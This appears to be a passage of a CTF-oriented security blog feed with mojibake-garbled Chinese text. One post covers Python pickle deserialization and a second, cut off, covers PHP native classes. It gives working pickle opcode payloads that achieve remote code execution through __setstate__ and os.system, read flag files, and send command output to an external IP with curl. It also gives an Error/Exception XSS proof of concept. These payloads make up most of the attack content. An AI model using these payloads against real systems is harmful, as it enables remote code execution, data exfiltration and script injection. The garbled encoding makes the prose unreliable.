<p><img src="/2025/05/13/%E9%9A%8F%E6%89%8B%E6%89%93%E7%9A%84pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/kisakiayano/source/_posts/%E9%9A%8F%E6%89%8B%E6%89%93%E7%9A%84pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/v2-2a5604887f01ef88aebf6409279e82a1_1440w.jpg" alt="img"></p>
<p>loadä¸€ä¸‹ï¼Œå‘ç°çœŸçš„å¼•å…¥äº†blueé‡Œé¢çš„å˜é‡</p>
<p>ã€€ã€€æŠŠè¿™ä¸ªpayloadè¿›è¡Œbase64ç¼–ç ä¹‹åä¼ è¿›é¢˜ç›®ï¼Œå¾—åˆ°well doneã€‚</p>
<p><img src="/2025/05/13/%E9%9A%8F%E6%89%8B%E6%89%93%E7%9A%84pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/kisakiayano/source/_posts/%E9%9A%8F%E6%89%8B%E6%89%93%E7%9A%84pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/v2-d02aeb43085db59a6d4b41f88c5ea68e_1440w.jpg" alt="img"></p>
<p>ã€€ã€€é¡ºå¸¦ä¸€æï¼Œç”±äºpickleå¯¼å‡ºçš„å­—ç¬¦ä¸²é‡Œé¢æœ‰å¾ˆå¤šçš„ä¸å¯è§å­—ç¬¦ï¼Œæ‰€ä»¥ä¸€èˆ¬éƒ½ç»è¿‡base64ç¼–ç ä¹‹åä¼ è¾“ã€‚</p>
<h4 id="ç»•è¿‡cæŒ‡ä»¤moduleé™åˆ¶ï¼šå…ˆè¯»å…¥ï¼Œå†ç¯¡æ”¹"><a href="#ç»•è¿‡cæŒ‡ä»¤moduleé™åˆ¶ï¼šå…ˆè¯»å…¥ï¼Œå†ç¯¡æ”¹" class="headerlink" title="ç»•è¿‡cæŒ‡ä»¤moduleé™åˆ¶ï¼šå…ˆè¯»å…¥ï¼Œå†ç¯¡æ”¹"></a>ç»•è¿‡<code>c</code>æŒ‡ä»¤<code>module</code>é™åˆ¶ï¼šå…ˆè¯»å…¥ï¼Œå†ç¯¡æ”¹</h4><p>ã€€ã€€ä¹‹å‰æåˆ°è¿‡ï¼Œ<code>c</code>æŒ‡ä»¤ï¼ˆä¹Ÿå°±æ˜¯GLOBALæŒ‡ä»¤ï¼‰åŸºäº<code>find_class</code>è¿™ä¸ªæ–¹æ³•ï¼Œ ç„¶è€Œ<code>find_class</code>å¯ä»¥è¢«å‡ºé¢˜äººé‡å†™ã€‚å¦‚æœå‡ºé¢˜äººåªå…è®¸<code>c</code>æŒ‡ä»¤åŒ…å«<code>__main__</code>è¿™ä¸€ä¸ªmoduleï¼Œè¿™é“é¢˜åˆè¯¥å¦‚ä½•è§£å†³å‘¢ï¼Ÿ</p>
<p>ã€€ã€€é€šè¿‡GLOBALæŒ‡ä»¤å¼•å…¥çš„å˜é‡ï¼Œå¯ä»¥çœ‹ä½œæ˜¯åŸå˜é‡çš„å¼•ç”¨ã€‚æˆ‘ä»¬åœ¨æ ˆä¸Šä¿®æ”¹å®ƒçš„å€¼ï¼Œä¼šå¯¼è‡´åŸå˜é‡ä¹Ÿè¢«ä¿®æ”¹ï¼</p>
<p>ã€€ã€€æœ‰äº†è¿™ä¸ªçŸ¥è¯†ä½œä¸ºå‰æï¼Œæˆ‘ä»¬å¯ä»¥å¹²è¿™ä¹ˆä¸€ä»¶äº‹ï¼š</p>
<ul>
<li>é€šè¿‡<code>__main__.blue</code>å¼•å…¥è¿™ä¸€ä¸ªmoduleï¼Œç”±äºå‘½åç©ºé—´è¿˜åœ¨mainå†…ï¼Œæ•…ä¸ä¼šè¢«æ‹¦æˆª</li>
<li>æŠŠä¸€ä¸ªdictå‹è¿›æ ˆï¼Œå†…å®¹æ˜¯<code>&#123;&#39;name&#39;: &#39;rua&#39;, &#39;grade&#39;: &#39;www&#39;&#125;</code></li>
<li>æ‰§è¡ŒBUILDæŒ‡ä»¤ï¼Œä¼šå¯¼è‡´æ”¹å†™ <code>__main__.blue.name</code>å’Œ <code>__main__.blue.grade</code> ï¼Œè‡³æ­¤<code>blue.name</code>å’Œ<code>blue.grade</code>å·²ç»è¢«ç¯¡æ”¹æˆæˆ‘ä»¬æƒ³è¦çš„å†…å®¹</li>
<li>å¼¹æ‰æ ˆé¡¶ï¼Œç°åœ¨æ ˆå˜æˆç©ºçš„</li>
<li>ç…§æŠ„æ­£å¸¸çš„Studentåºåˆ—åŒ–ä¹‹åçš„å­—ç¬¦ä¸²ï¼Œå‹å…¥ä¸€ä¸ªæ­£å¸¸çš„Studentå¯¹è±¡ï¼Œnameå’Œgradeåˆ†åˆ«æ˜¯â€™ruaâ€™å’Œâ€™wwwâ€™</li>
</ul>
<p>ã€€ã€€ç”±äºæ ˆé¡¶æ˜¯æ­£å¸¸çš„Studentå¯¹è±¡ï¼Œpickle.loadså°†ä¼šæ­£å¸¸è¿”å›ã€‚åˆ°æ‰‹çš„Studentå¯¹è±¡ï¼Œå½“ç„¶nameå’Œgradeéƒ½ä¸blue.nameã€blue.gradeå¯¹åº”äº†â€”â€”æˆ‘ä»¬åˆšåˆšäº²æ‰‹æŠŠblueç¯¡æ”¹æ‰ã€‚</p>
<pre><code class="highlight text">payload = b&#x27;\x80\x03c__main__\nblue\n&#125;(Vname\nVrua\nVgrade\nVwww\nub0c__main__\nStudent\n)\x81&#125;(X\x04\x00\x00\x00nameX\x03\x00\x00\x00ruaX\x05\x00\x00\x00gradeX\x03\x00\x00\x00wwwub.&#x27;</code></pre>

<p><img src="/2025/05/13/%E9%9A%8F%E6%89%8B%E6%89%93%E7%9A%84pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/kisakiayano/source/_posts/%E9%9A%8F%E6%89%8B%E6%89%93%E7%9A%84pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/v2-be0b611551c62614ea92f06ffe234480_1440w.jpg" alt="img"></p>
<p>ç»¿æ¡†åŒºåŸŸå®Œæˆäº†ç¯¡æ”¹</p>
<p><img src="/2025/05/13/%E9%9A%8F%E6%89%8B%E6%89%93%E7%9A%84pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/kisakiayano/source/_posts/%E9%9A%8F%E6%89%8B%E6%89%93%E7%9A%84pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/v2-5d923ca1b18273daec2e8131b64b8721_1440w.jpg" alt="img"></p>
<p>ã€€ã€€é¢˜ç›®è¿”å›äº†well doneï¼Œè€Œä¸”æ­¤æ—¶blue.gradeå·²ç»å˜æˆwwwï¼Œå¯è§æˆ‘ä»¬çœŸçš„ç¯¡æ”¹äº†blue.</p>
<p>æ‰€ä»¥æ€è·¯å°±æ˜¯ç”¨ç°æˆçš„ç™½åå•æ¥è¿›è¡ŒRCE</p>
<h4 id="ä¸ç”¨reduceï¼Œä¹Ÿèƒ½RCE"><a href="#ä¸ç”¨reduceï¼Œä¹Ÿèƒ½RCE" class="headerlink" title="ä¸ç”¨reduceï¼Œä¹Ÿèƒ½RCE"></a>ä¸ç”¨reduceï¼Œä¹Ÿèƒ½RCE</h4><p>ã€€ã€€ä¹‹å‰è°ˆåˆ°è¿‡ï¼Œ<code>__reduce__</code>ä¸<code>R</code>æŒ‡ä»¤æ˜¯ç»‘å®šçš„ï¼Œç¦æ­¢äº†<code>R</code>æŒ‡ä»¤å°±ç¦æ­¢äº†<code>__reduce__</code> æ–¹æ³•ã€‚é‚£ä¹ˆï¼Œåœ¨ç¦æ­¢<code>R</code>æŒ‡ä»¤çš„æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬è¿˜èƒ½RCEå—ï¼Ÿè¿™å°±æ˜¯æœ¬æ–‡ç ”ç©¶çš„é‡ç‚¹ã€‚</p>
<p>ã€€ã€€ç°åœ¨çš„ç›®æ ‡æ˜¯ï¼Œåˆ©ç”¨æŒ‡ä»¤ç ï¼Œæ„é€ å‡ºä»»æ„å‘½ä»¤æ‰§è¡Œã€‚é‚£ä¹ˆæˆ‘ä»¬éœ€è¦æ‰¾åˆ°ä¸€ä¸ªå‡½æ•°è°ƒç”¨<code>fun(arg)</code>ï¼Œå…¶ä¸­<code>fun</code>å’Œ<code>arg</code>éƒ½å¿…é¡»å¯æ§ã€‚</p>
<p>ã€€ã€€å®¡pickleæºç ï¼Œæ¥çœ‹çœ‹BUILDæŒ‡ä»¤ï¼ˆæŒ‡ä»¤ç ä¸º<code>b</code>ï¼‰æ˜¯å¦‚ä½•å·¥ä½œçš„ï¼š</p>
<p><img src="/2025/05/13/%E9%9A%8F%E6%89%8B%E6%89%93%E7%9A%84pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/kisakiayano/source/_posts/%E9%9A%8F%E6%89%8B%E6%89%93%E7%9A%84pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/v2-ae7ce8d82f16d90bda791e4bc5e06f1d_1440w.jpg" alt="img"></p>
<p>BUILDæŒ‡ä»¤å®ç°</p>
<p>ã€€ã€€è¿™é‡Œçš„å®ç°æ–¹å¼ä¹Ÿå°±æ˜¯ä¸Šæ–‡çš„æ³¨æ‰€æåˆ°çš„ï¼šå¦‚æœ<code>inst</code>æ‹¥æœ‰<code>__setstate__</code>æ–¹æ³•ï¼Œåˆ™æŠŠ<code>state</code>äº¤ç»™<code>__setstate__</code>æ–¹æ³•æ¥å¤„ç†ï¼›å¦åˆ™çš„è¯ï¼Œç›´æ¥æŠŠ<code>state</code>è¿™ä¸ª<code>dist</code>çš„å†…å®¹ï¼Œåˆå¹¶åˆ°<code>inst.__dict__ </code>é‡Œé¢ã€‚</p>
<p>ã€€ã€€å®ƒæœ‰ä»€ä¹ˆå®‰å…¨éšæ‚£å‘¢ï¼Ÿæˆ‘ä»¬æ¥æƒ³æƒ³çœ‹ï¼š<code>Student</code>åŸå…ˆæ˜¯æ²¡æœ‰<code>__setstate__</code>è¿™ä¸ªæ–¹æ³•çš„ã€‚é‚£ä¹ˆæˆ‘ä»¬åˆ©ç”¨<code>&#123;&#39;__setstate__&#39;: os.system&#125;</code>æ¥BUILEè¿™ä¸ªå¯¹è±¡ï¼Œé‚£ä¹ˆç°åœ¨å¯¹è±¡çš„<code>__setstate__</code>å°±å˜æˆäº†<code>os.system</code>ï¼›æ¥ä¸‹æ¥åˆ©ç”¨<code>&quot;ls /&quot;</code>æ¥å†æ¬¡BUILDè¿™ä¸ªå¯¹è±¡ï¼Œåˆ™ä¼šæ‰§è¡Œ<code>setstate(&quot;ls /&quot;)</code> ï¼Œè€Œæ­¤æ—¶<code>__setstate__</code>å·²ç»è¢«æˆ‘ä»¬è®¾ç½®ä¸º<code>os.system</code>ï¼Œå› æ­¤å®ç°äº†RCE.</p>
<p>ã€€ã€€payloadæ„é€ å¦‚ä¸‹ï¼š</p>
<pre><code class="highlight text">payload = b&#x27;\x80\x03c__main__\nStudent\n)\x81&#125;(V__setstate__\ncos\nsystem\nubVls /\nb.&#x27;</code></pre>

<p><img src="/2025/05/13/%E9%9A%8F%E6%89%8B%E6%89%93%E7%9A%84pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/kisakiayano/source/_posts/%E9%9A%8F%E6%89%8B%E6%89%93%E7%9A%84pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/v2-5f6f6661a916b296e3fac6fbed8427cc_1440w.jpg" alt="img"></p>
<p>ã€€ã€€æ‰§è¡Œç»“æœï¼š</p>
<p><img src="/2025/05/13/%E9%9A%8F%E6%89%8B%E6%89%93%E7%9A%84pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/kisakiayano/source/_posts/%E9%9A%8F%E6%89%8B%E6%89%93%E7%9A%84pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/v2-44a237be1ffe80cf2969d217831fe5dd_1440w.jpg" alt="img"></p>
<p>ã€€ã€€æˆåŠŸRCEï¼æ¥ä¸‹æ¥å¯ä»¥é€šè¿‡åå¼¹shellæ¥æ§åˆ¶é¶æœºäº†ã€‚</p>
<p>ã€€ã€€æœ‰ä¸€ä¸ªå¯ä»¥æ”¹è¿›çš„åœ°æ–¹ï¼šè¿™ä»½payloadç”±äºæ²¡æœ‰è¿”å›ä¸€ä¸ªStudentï¼Œå¯¼è‡´åé¢æŠ›å‡ºå¼‚å¸¸ã€‚è¦è®©åé¢æ— å¼‚å¸¸ä¹Ÿå¾ˆç®€å•ï¼šå¹²å®Œäº†æ¶æ„ä»£ç ä¹‹åæŠŠæ ˆå¼¹åˆ°ç©ºï¼Œç„¶åå‹ä¸€ä¸ªæ­£å¸¸Studentè¿›æ ˆã€‚payloadæ„é€ å¦‚ä¸‹ï¼š</p>
<pre><code class="highlight text">payload = b&#x27;\x80\x03c__main__\nStudent\n)\x81&#125;(V__setstate__\ncos\nsystem\nubVls /\nb0c__main__\nStudent\n)\x81&#125;(X\x04\x00\x00\x00nameX\x03\x00\x00\x00ruaX\x05\x00\x00\x00gradeX\x03\x00\x00\x00wwwub.&#x27;</code></pre>

<p><img src="/2025/05/13/%E9%9A%8F%E6%89%8B%E6%89%93%E7%9A%84pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/kisakiayano/source/_posts/%E9%9A%8F%E6%89%8B%E6%89%93%E7%9A%84pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/v2-fd188e8d3e3f341d719019b7e869bf9d_1440w.jpg" alt="img"></p>
<p>ç»¿è‰²æ¡†å†…ä¸ºæ¶æ„ä»£ç </p>
<p><img src="/2025/05/13/%E9%9A%8F%E6%89%8B%E6%89%93%E7%9A%84pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/kisakiayano/source/_posts/%E9%9A%8F%E6%89%8B%E6%89%93%E7%9A%84pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/v2-d5b6e15f6b0506689952cf0e8f93691f_1440w.jpg" alt="img"></p>
<p>ã€€ã€€æ²¡æœ‰æŠ›å‡ºå¼‚å¸¸ã€‚</p>
<p>ã€€ã€€<strong>è‡³æ­¤ï¼Œæˆ‘ä»¬å®Œæˆäº†ä¸ä½¿ç”¨<code>R</code>æŒ‡ä»¤ã€æ— å‰¯ä½œç”¨çš„RCEã€‚</strong></p>
<p>é™¤æ­¤ä¹‹å¤–ï¼Œå…¶å®æˆ‘ä»¬è¿˜æ˜¯å¯ä»¥é€šè¿‡ä¸€äº›å…¶ä»–ç±»ä¼¼çš„æ¼æ´æ–¹æ³•æ¥æ‰“rce</p>
<pre><code class="highlight python">__reduce_ex__()
__setstate__()</code></pre>

<p>å®ä¾‹</p>
<pre><code class="highlight plaintext">#__setstate__:
import pickle
import pickletools
import os
class obj:
   def __init__(self,str1,str2):
      self.str1=str1;
      self.str2=str2;
   def __setstate__(self,name):
        os.system(&#x27;dir&#x27;)
#    def __reduce__(self):
#       return(os.system,(&#x27;dir&#x27;,))
class1=obj(&quot;str1&quot;,&quot;str2&quot;)
a=pickle.dumps(class1)      
print(a)
b=a
pickle.loads(b)

#setstate
</code></pre>

<h4 id="ä¸€äº›ç»†èŠ‚"><a href="#ä¸€äº›ç»†èŠ‚" class="headerlink" title="ä¸€äº›ç»†èŠ‚"></a>ä¸€äº›ç»†èŠ‚</h4><p>ã€€ã€€<strong>ä¸€</strong>ã€<strong>å…¶ä»–æ¨¡å—çš„loadä¹Ÿå¯ä»¥è§¦å‘pickleååºåˆ—åŒ–æ¼æ´ã€‚</strong>ä¾‹å¦‚ï¼š<code>numpy.load()</code>å…ˆå°è¯•ä»¥numpyè‡ªå·±çš„æ•°æ®æ ¼å¼å¯¼å…¥ï¼›å¦‚æœå¤±è´¥ï¼Œåˆ™å°è¯•ä»¥pickleçš„æ ¼å¼å¯¼å…¥ã€‚å› æ­¤<code>numpy.load()</code>ä¹Ÿå¯ä»¥è§¦å‘pickleååºåˆ—åŒ–æ¼æ´ã€‚</p>
<p>ã€€ã€€äºŒã€å³ä½¿ä»£ç ä¸­æ²¡æœ‰<code>import os</code>ï¼Œ**GLOBALæŒ‡ä»¤ä¹Ÿå¯ä»¥è‡ªåŠ¨å¯¼å…¥<code>os.system</code>**ã€‚å› æ­¤ï¼Œä¸èƒ½è®¤ä¸ºâ€œæˆ‘ä¸åœ¨ä»£ç é‡Œé¢å¯¼å…¥osåº“ï¼Œpickleååºåˆ—åŒ–çš„æ—¶å€™å°±ä¸èƒ½æ‰§è¡Œos.systemâ€ã€‚</p>
<p>ã€€ã€€ä¸‰ã€<strong>å³ä½¿æ²¡æœ‰å›æ˜¾ï¼Œä¹Ÿå¯ä»¥å¾ˆæ–¹ä¾¿åœ°è°ƒè¯•æ¶æ„ä»£ç ã€‚</strong>åªéœ€è¦æ‹¥æœ‰ä¸€å°å…¬ç½‘æœåŠ¡å™¨ï¼Œæ‰§è¡Œ<code>os.system(&#39;curl your_server/</code>ls &#x2F; | base64<code>)</code>ï¼Œç„¶åæŸ¥è¯¢æ‚¨è‡ªå·±çš„æœåŠ¡å™¨æ—¥å¿—ï¼Œå°±èƒ½çœ‹åˆ°ç»“æœã€‚è¿™æ˜¯å› ä¸ºï¼šä»¥&#96;&#96;&#96;å¼•å·åŒ…å«çš„ä»£ç ï¼Œåœ¨shä¸­ä¼šç›´æ¥æ‰§è¡Œï¼Œè¿”å›å…¶ç»“æœã€‚</p>
<p>ã€€ã€€ä¸‹é¢ç»™å‡ºä¸€ä¸ªä¾‹å­ï¼š</p>
<pre><code class="highlight text">payload  = b&#x27;\x80\x03c__main__\nStudent\n)\x81&#125;(V__setstate__\ncos\nsystem\nubVcurl 47.***.***.105/`ls / | base64`\nb.&#x27;</code></pre>

<p><img src="/2025/05/13/%E9%9A%8F%E6%89%8B%E6%89%93%E7%9A%84pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/kisakiayano/source/_posts/%E9%9A%8F%E6%89%8B%E6%89%93%E7%9A%84pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/v2-f60a5ad59d548b1ca78b839320318dfe_1440w.jpg" alt="img"></p>
<p>payload</p>
<p><img src="/2025/05/13/%E9%9A%8F%E6%89%8B%E6%89%93%E7%9A%84pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/kisakiayano/source/_posts/%E9%9A%8F%E6%89%8B%E6%89%93%E7%9A%84pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/v2-377763e71f5d198566d7b40e418289f8_1440w.jpg" alt="img"></p>
<p>pickle.loads()æ•ˆæœ</p>
<p><img src="/2025/05/13/%E9%9A%8F%E6%89%8B%E6%89%93%E7%9A%84pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/kisakiayano/source/_posts/%E9%9A%8F%E6%89%8B%E6%89%93%E7%9A%84pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/v2-0c450bc39b3ce69cdf14486ed14752c1_1440w.jpg" alt="img"></p>
<p><code>pickle.loads()</code>æ—¶ï¼Œ<code>ls /</code>çš„ç»“æœè¢«base64ç¼–ç åå‘é€ç»™æœåŠ¡å™¨ï¼ˆçº¢æ¡†ï¼‰ï¼›æˆ‘ä»¬çš„æœåŠ¡å™¨æŸ¥çœ‹æ—¥å¿—ï¼Œå°±å¯ä»¥å¾—åˆ°å‘½ä»¤æ‰§è¡Œç»“æœã€‚å› æ­¤ï¼Œåœ¨æ²¡æœ‰å›æ˜¾çš„æ—¶å€™ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡<code>curl</code>æŠŠæ‰§è¡Œç»“æœé€åˆ°æˆ‘ä»¬çš„æœåŠ¡å™¨ä¸Šã€‚</p>
<p>ã€€ã€€ä¸Šæ–‡å‘å‡ºå»çš„è¯·æ±‚ç¼ºäº†ä¸€æ®µï¼Œæ˜¯å› ä¸ºurlæ²¡æœ‰åŠ å¼•å·ã€‚</p>
<p>GLOBALæ“ä½œç¬¦</p>
<pre><code class="highlight plaintext">GLOBALæ“ä½œç¬¦è¯»å–å…¨å±€å˜é‡ï¼Œæ˜¯ä½¿ç”¨çš„find_classå‡½æ•°ã€‚è€Œfind_classå¯¹äºä¸åŒçš„åè®®ç‰ˆæœ¬å®ç°ä¹Ÿä¸ä¸€æ ·ã€‚æ€»ä¹‹ï¼Œå®ƒå¹²çš„äº‹æƒ…æ˜¯â€œå»xæ¨¡å—æ‰¾åˆ°yâ€ï¼Œyå¿…é¡»åœ¨xçš„é¡¶å±‚ï¼ˆä¹Ÿå³ï¼Œyä¸èƒ½åœ¨åµŒå¥—çš„å†…å±‚ï¼‰</code></pre>

<h3 id="æ‰‹æ“opcode"><a href="#æ‰‹æ“opcode" class="headerlink" title="æ‰‹æ“opcode"></a>æ‰‹æ“opcode</h3><p>åªè¦ä¼šè‡ªå·±å†™opcodeäº‹æƒ…å°±ç®€å•å¤šäº†ã€‚æŠŠã€‚</p>
<ol>
<li>oæŒ‡ä»¤ç»•è¿‡</li>
</ol>
<pre><code class="highlight plaintext">payload1 = b&#x27;&#x27;&#x27;(cos
system
S&#x27;cat /f* &gt; /tmp/a&#x27;
o.&#x27;&#x27;&#x27;</code></pre>

<blockquote>
<p>å…ˆæ˜¯ç”¨ ( å…¥æ ˆä¸€ä¸ªMARKï¼Œç„¶åç”¨ c å¯¼å…¥os.system()å‡½æ•°å…¥æ ˆï¼Œç„¶åç”¨ S å®šä¹‰å­—ç¬¦ä¸²å¹¶å…¥æ ˆï¼Œæœ€åç”¨ o <strong>å¯»æ‰¾æ ˆä¸­çš„ä¸Šä¸€ä¸ªMARKï¼Œä»¥ä¹‹é—´çš„ç¬¬ä¸€ä¸ªæ•°æ®ï¼ˆå¿…é¡»ä¸ºå‡½æ•°ï¼‰ä¸ºcallableï¼Œç¬¬äºŒä¸ªåˆ°ç¬¬nä¸ªæ•°æ®ä¸ºå‚æ•°ï¼Œæ‰§è¡Œè¯¥å‡½æ•°ï¼Œ</strong>ç»“æœæ˜¯os.system(cat &#x2F;f* &gt; &#x2F;tmp&#x2F;aâ€™o)ï¼Œ ç‚¹å·æ˜¯ç»“æŸçš„æ„æ€</p>
</blockquote>
<ol start="2">
<li>bæŒ‡ä»¤ç»•è¿‡</li>
</ol>
<pre><code class="highlight plaintext">payload2 =(c__main__
User
o&#125;(S&quot;\x5f\x5f\x73\x65\x74\x73\x74\x61\x74\x65\x5f\x5f&quot; //__setstate__
cos
system
ubS&quot;cat /ffl14aaaaaaagg&gt;/tmp/gkjzjh146&quot;
b.</code></pre>

<p>3.sæŒ‡ä»¤ç»•è¿‡</p>
<p>å¦‚æœ<code>&#39;</code>æˆ–è€…<code>&quot;</code>è¢«banäº†çš„è¯æ€ä¹ˆåŠæï¼Œå¯ä»¥ç”¨Væ¥ä»£æ›¿</p>
<pre><code class="highlight plaintext">S&#x27;ls&#x27;
å’Œ
Vls
æ˜¯ä¸€æ ·çš„æ•ˆæœ</code></pre>

<p>4.iä¸€æŠŠæ¢­</p>
<pre><code class="highlight python"><span class="keyword">import</span> pickle
opcode=<span class="string">b&#x27;&#x27;&#x27;(Vls</span>
<span class="string">ios</span>
<span class="string">system</span>
<span class="string">.&#x27;&#x27;&#x27;</span>
pickle.loads(opcode)</code></pre>

<p>ç›´æ¥ä»£æ›¿äº†cå’Œoçš„åŠŸèƒ½</p>
]]></content>
      <tags>
        <tag>-Web</tag>
      </tags>
  </entry>
  <entry>
    <title>ç£¨å¥½çš„åˆ©å‰‘:PHPåŸç”Ÿç±»</title>
    <url>/2025/07/01/%E7%A3%A8%E5%A5%BD%E7%9A%84%E5%88%A9%E5%89%91-PHP%E5%8E%9F%E7%94%9F%E7%B1%BB/</url>
    <content><![CDATA[<h1 id="PHPåŸç”Ÿç±»"><a href="#PHPåŸç”Ÿç±»" class="headerlink" title="PHPåŸç”Ÿç±»"></a>PHPåŸç”Ÿç±»</h1><p>ç›¸å½“ç»¼åˆçš„åº”ç”¨å‘¢ï¼Œåˆ©ç”¨é¢å¹¿çš„ä¸è¡Œï¼Œçˆ½èµ¤</p>
<p>å¸¸è§çš„åŸç”Ÿç±»æœ‰ä»¥ä¸‹å‡ ä¸ª</p>
<pre><code class="highlight plaintext">1.Error/Exception
2.FilesystemIterator/SplFileObject/DirectoryIterator/GlobIterator
3.SoapClient
4.SimpleXMLElement</code></pre>

<p>å½“ç„¶è¿˜æœ‰æœ‰äº›å¶å°”èƒ½ç”¨ä¸Šçš„<code>ZipArchive</code></p>
<h2 id="XSSåˆ©ç”¨"><a href="#XSSåˆ©ç”¨" class="headerlink" title="XSSåˆ©ç”¨"></a>XSSåˆ©ç”¨</h2><h3 id="Error-Exceptionå†…ç½®ç±»"><a href="#Error-Exceptionå†…ç½®ç±»" class="headerlink" title="Error&#x2F;Exceptionå†…ç½®ç±»"></a>Error&#x2F;Exceptionå†…ç½®ç±»</h3><p><strong>Error</strong>:</p>
<ul>
<li>ä»…é€‚ç”¨äºPHP7ç‰ˆæœ¬</li>
<li>åœ¨å¼€å¯æŠ¥é”™çš„æƒ…å†µä¸‹</li>
</ul>
<p>æˆ‘ä»¬å¯ä»¥æŸ¥çœ‹ä¸€ä¸‹Errorçš„å†…ç½®æ–¹æ³•</p>
<pre><code class="highlight php"><span class="meta">&lt;?php</span>
<span class="variable">$className</span> = <span class="string">&#x27;Error&#x27;</span>;

<span class="variable">$methods</span> = <span class="title function_ invoke__">get_class_methods</span>(<span class="variable">$className</span>);

<span class="keyword">foreach</span> (<span class="variable">$methods</span> <span class="keyword">as</span> <span class="variable">$method</span>) &#123;
    <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">&#123;$className&#125;</span>::<span class="subst">&#123;$method&#125;</span>&quot;</span> . PHP_EOL;
&#125;
<span class="meta">?&gt;</span></code></pre>

<p>å¾—åˆ°:</p>
<pre><code class="highlight plaintext">Error::__construct
Error::__wakeup
Error::getMessage
Error::getCode
Error::getFile
Error::getLine
Error::getTrace
Error::getPrevious
Error::getTraceAsString
Error::__toString</code></pre>

<p>é‚£ä¹ˆå°±å¯ä»¥åˆ©ç”¨XSSçš„<code>__toString</code>é­”æœ¯æ–¹æ³•æ‰“ä¸€ä¸ªXSS</p>
<p>æµ‹è¯•ä»£ç :</p>
<pre><code class="highlight php"><span class="meta">&lt;?php</span>
<span class="variable">$a</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;whoami&#x27;</span>]);
<span class="keyword">echo</span> <span class="variable">$a</span>;
<span class="meta">?&gt;</span></code></pre>

<p>(å¦‚æœä¸çŸ¥é“åŸç”Ÿç±»çš„æƒ…å†µä¸‹å¯èƒ½ç›´æ¥è¶‹åŠ¿äº†å§</p>
<p>é‚£ä¹ˆå°±ç”¨Errorç±»æ„é€ ä¸€ä¸ªPOC</p>
<pre><code class="highlight php"><span class="meta">&lt;?php</span>
<span class="variable">$a</span> = <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;&quot;</span>);
<span class="variable">$b</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);
<span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="variable">$b</span>);  
<span class="meta">?&gt;</span>
<span class="comment">//O%3A5%3A%22Error%22%3A7%3A%7Bs%3A10%3A%22%00%2A%00message%22%3Bs%3A29%3A%22%3Cscript%3Ealert%28%27xss%27%29%3C%2Fscript%3E%22%3Bs%3A13%3A%22%00Error%00string%22%3Bs%3A0%3A%22%22%3Bs%3A7%3A%22%00%2A%00code%22%3Bi%3A0%3Bs%3A7%3A%22%00%2A%00file%22%3Bs%3A44%3A%22C%3A%5CUsers%5Cayano%5CPhpstormProjects%5CWWW%5Ctest.php%22%3Bs%3A7%3A%22%00%2A%00line%22%3Bi%3A2%3Bs%3A12%3A%22%00Error%00trace%22%3Ba%3A0%3A%7B%7Ds%3A15%3A%22%00Error%00previous%22%3BN%3B%7D</span></code></pre>

<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250701145615605.png" alt="image-20250701145615605"></p>
<p>å¯ä»¥çœ‹åˆ°æˆåŠŸå¼¹å‡º</p>
<p><code>Exception</code>ä¹Ÿæ˜¯åŒç†çš„</p>
<p>å¾—åˆ°</p>
<pre><code class="highlight plaintext">O%3A9%3A%22Exception%22%3A7%3A%7Bs%3A10%3A%22%00%2A%00message%22%3Bs%3A29%3A%22%3Cscript%3Ealert%28%27xss%27%29%3C%2Fscript%3E%22%3Bs%3A17%3A%22%00Exception%00string%22%3Bs%3A0%3A%22%22%3Bs%3A7%3A%22%00%2A%00code%22%3Bi%3A0%3Bs%3A7%3A%22%00%2A%00file%22%3Bs%3A46%3A%22C%3A%5CUsers%5Cayano%5CPhpstormProjects%5CWWW%5Cmethod.php%22%3Bs%3A7%3A%22%00%2A%00line%22%3Bi%3A2%3Bs%3A16%3A%22%00Exception%00trace%22%3Ba%3A0%3A%7B%7Ds%3A19%3A%22%00Exception%00previous%22%3BN%3B%7D</code></pre>

<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250701150814244.png" alt="image-20250701150814244"></p>
<h2 id="SSRFåˆ©ç”¨"><a href="#SSRFåˆ©ç”¨" class="headerlink" title="SSRFåˆ©ç”¨"></a>SSRFåˆ©ç”¨</h2><p>ç”¨Soapä¹‹å‰å…ˆè¦åœ¨php.inié‡Œå¼€ä¸€ä¸‹extension</p>
